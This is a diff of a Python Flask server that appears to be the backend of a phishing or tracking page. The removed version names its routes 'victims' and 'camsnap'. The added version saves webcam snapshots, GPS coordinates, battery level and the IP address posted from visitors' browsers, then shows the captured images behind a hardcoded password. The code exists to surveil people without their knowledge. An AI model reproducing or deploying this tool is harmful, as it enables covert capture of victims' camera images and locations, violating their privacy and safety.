@@ -1,52 +1,87 @@
-#NOTE THIS CODE IS GENERATED USING CHATGPT
-
-
-
+from flask import Flask, render_template, request, jsonify, send_from_directory
+import json
+import base64
 import os
-from flask import Flask, render_template, request
+import random
+import string
 
 app = Flask(__name__)
-app.config['STATIC_FOLDER'] = 'public'
-app.config['TEMPLATES_FOLDER'] = 'views'
+app.config['UPLOAD_FOLDER'] = './'
+app.config['PASSWORD'] = 'NOA'
+
+def is_authenticated(password):
+    return password == app.config['PASSWORD']
 
 @app.route('/')
 def index():
-    ip = request.headers.get('x-forwarded-for') or request.remote_addr
-    time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    return render_template('index.html', ip=ip, time=time, redirect="https://google.com", camera=True, cams=config.4, location=True)
+    return render_template('index.html')
 
-@app.route('/victims')
-def victims():
-    return render_template('victims.html')
+@app.route('/save-image', methods=['POST'])
+def save_image():
+    data = request.json
+    image_data = data['image']
+    camera_type = data['camera']
 
-@app.route('/', methods=['POST'])
-def save_victim():
-    data = request.form['data']
-    with open(os.path.join(app.config['TEMPLATES_FOLDER'], 'victims.ejs'), 'a') as file:
-        file.write(data + '\n\n')
-    return 'Done'
+    # Generate a random ID for the image filename
+    image_id = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=4))
+    image_filename = f"{request.remote_addr}_img_{image_id}.png"
 
-@app.route('/camsnap', methods=['POST'])
-def save_camsnap():
-    img_data = request.form['img']
-    path = os.path.join(app.config['STATIC_FOLDER'], 'images')
-    if not os.path.exists(path):
-        os.makedirs(path)
-    filename = save_base64_image(img_data, path, 'png')
-    return filename
+    # Save the image file
+    image_data = image_data.replace('data:image/png;base64,', '')
+    try:
+        with open(image_filename, 'wb') as f:
+            f.write(base64.b64decode(image_data))
+    except Exception as e:
+        print('Error saving image:', str(e))
+        return jsonify(status='error')
 
-def save_base64_image(base64_string, output_path, image_type):
-    _, data = base64_string.split(',')
-    image_data = base64.b64decode(data)
-    filename = generate_filename(output_path, image_type)
-    with open(filename, 'wb') as file:
-        file.write(image_data)
-    return filename
+    return jsonify(status='success')
 
-def generate_filename(output_path, image_type):
-    count = len(os.listdir(output_path)) + 1
-    filename = f'image_{count}.{image_type}'
-    return os.path.join(output_path, filename)
+@app.route('/save-user-info', methods=['POST'])
+def save_user_info():
+    data = request.json
+
+    # Get the user information
+    ip_address = request.remote_addr
+    battery_level = data['batteryLevel']
+    latitude = data['latitude']
+    longitude = data['longitude']
+
+    # Generate a random ID for the JSON filename
+    json_id = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=4))
+    json_filename = f"{request.remote_addr}_{json_id}.json"
+
+    # Create a dictionary with the user information
+    user_info = {
+        'ip_address': ip_address,
+        'battery_level': battery_level,
+        'latitude': latitude,
+        'longitude': longitude
+    }
+
+    # Save the user information as JSON
+    try:
+        with open(json_filename, 'w') as f:
+            json.dump(user_info, f)
+    except Exception as e:
+        print('Error saving user info:', str(e))
+        return jsonify(status='error')
+
+    return jsonify(status='success')
+
+@app.route('/data')
+def data():
+    # Check authentication
+    password = request.args.get('password')
+    if not is_authenticated(password):
+        return 'Unauthorized', 401
+
+    image_files = [f for f in os.listdir(app.config['UPLOAD_FOLDER']) if f.endswith('.png')]
+    return render_template('data.html', image_files=image_files)
+
+@app.route('/images/<path:filename>')
+def get_image(filename):
+    return send_from_directory('./', filename)
 
 if __name__ == '__main__':
-    app.run(port=5000, debug=True)
+    app.run()
